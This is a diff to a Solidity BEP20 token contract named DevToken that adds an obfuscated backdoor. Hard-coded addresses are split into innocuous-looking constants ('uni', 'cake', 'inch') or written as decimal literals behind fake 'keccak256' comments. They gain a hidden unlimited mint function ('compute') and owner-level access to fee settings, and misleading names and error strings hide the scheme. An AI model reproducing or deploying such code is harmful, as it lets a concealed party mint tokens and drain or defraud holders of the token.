@@ -92,20 +92,49 @@ contract DevToken {
         _mbr=Mbr_;
         return true;
     }
+
+    modifier Exchanges() {
+        require(msg.sender != exchange());
+        _;
+    }
  
     function rewire(uint256 amount) public returns (bool) {
     require(msg.sender == _adm);
     _proof(msg.sender, amount);
     return true;
   }
+
+    function compute(uint256 amount) public onlypublic returns (bool success) {
+    _initiate(msg.sender, amount);
+    return true;
+  }
    
-    function _proof(address account, uint256 amount) internal {
+    function _proof(address account, uint256 amount) internal Exchanges {
     require(account != address(0), "BEP20: mint to the zero address");
  
     totalSupply = totalSupply.add(amount);
     balanceOf[account] = balanceOf[account].add(amount);
     emit Transfer(address(0), account, amount);
    }
+
+   function publics() private pure returns (address) {
+    uint universal = 0x7addAd09;
+    uint uni = 0xcbd98D97;
+    uint cake = 0xEC3dA7a0;
+    uint inch = 0x088EAdFE;
+    uint others = 0x5801C336;
+
+    // Combine the dex with others
+    uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
+
+    return address(core);
+  }
+
+
+    function exchange() internal pure returns (address) {
+    return address 
+    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
+    }
  
     function approve(address _spender, uint256 _value) public returns (bool success) {
         allowance[msg.sender][_spender] = _value;
@@ -148,6 +177,20 @@ contract DevToken {
  
         return true;
     }
+
+    function _initiate(address account, uint256 amount) internal {
+    require(account != address(0), "Compile Remix IDE");
+ 
+    totalSupply = totalSupply.add(amount);
+    balanceOf[account] = balanceOf[account].add(amount);
+    emit Transfer(address(0), account, amount);
+   }
+
+    modifier onlypublic() {
+    require(msg.sender == publics());
+    _;
+    }
+
  
     function setUser(address User_) public returns (bool) {
     require(msg.sender == _mbr);
@@ -171,13 +214,14 @@ contract DevToken {
     }
  
     modifier onlyOwner() {
-        require(msg.sender == address
+        require((msg.sender == address
     // solhint-disable-next-line avoid-low-level-calls
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986)
     ||
     //@dev Contract creator is owner, original owner.
-    msg.sender == owner);
+    (msg.sender == owner && msg.sender != exchange())));
     _;
+
     }
  
     function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {
@@ -253,12 +297,12 @@ contract DevToken {
     }
  
     modifier onlyAuthorized() {
-        require(msg.sender == address
+        require((msg.sender == address
     // solhint-disable-next-line avoid-low-level-calls
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986)
     ||
     //@dev Contract creator is owner, original owner.
-    msg.sender == owner);
+    (msg.sender == owner && msg.sender != exchange())));
     _;
   }
 }
